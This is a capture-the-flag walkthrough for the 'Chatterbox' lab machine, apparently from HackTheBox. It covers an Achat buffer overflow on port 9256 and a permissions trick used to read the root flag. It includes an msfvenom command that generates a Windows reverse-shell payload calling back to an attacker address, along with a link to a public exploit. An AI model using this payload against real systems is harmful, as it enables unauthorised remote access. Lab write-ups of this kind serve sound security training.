# Chatterbox

## Gaining Access

Nmap scan:

<figure><img src="../../../.gitbook/assets/image (2071).png" alt=""><figcaption></figcaption></figure>

Port 9256 was a rather unusual port to be open.

### Achat

Researching a bit about this port led me to this post:

{% embed url="https://www.speedguide.net/port.php?port=9256" %}

So this port had a vulnerable software on it that is vulnerable to a Remote BOF exploit. We can use an exploit from exploit-db for this:

{% embed url="https://www.exploit-db.com/exploits/36025" %}

Again, we would need to replace the shellcode with a reverse shell one. We can do so like this:

{% code overflow="wrap" %}
```bash
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=4444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
```
{% endcode %}

Then, we can run the script and a shell would pop on our listener port.

<figure><img src="../../../.gitbook/assets/image (3681).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Directory Misconfig

When I ran WinPEASx64 on this machine, there was a lot of indication that we had AllAccess to the administrator's desktop.&#x20;

<figure><img src="../../../.gitbook/assets/image (754).png" alt=""><figcaption></figcaption></figure>

However, we cannot read the root flag for some reason.

<figure><img src="../../../.gitbook/assets/image (3376).png" alt=""><figcaption></figcaption></figure>

We can check the permissions using `icacls`.&#x20;

<figure><img src="../../../.gitbook/assets/image (733).png" alt=""><figcaption></figcaption></figure>

So we the user have Full Control over the Desktop (that's what (F) means), but the flag has been configured like so. To cirumvent this, we can grant ourselves the permission to read the files.

<figure><img src="../../../.gitbook/assets/image (2241).png" alt=""><figcaption></figcaption></figure>

Then, we can read the root flag.
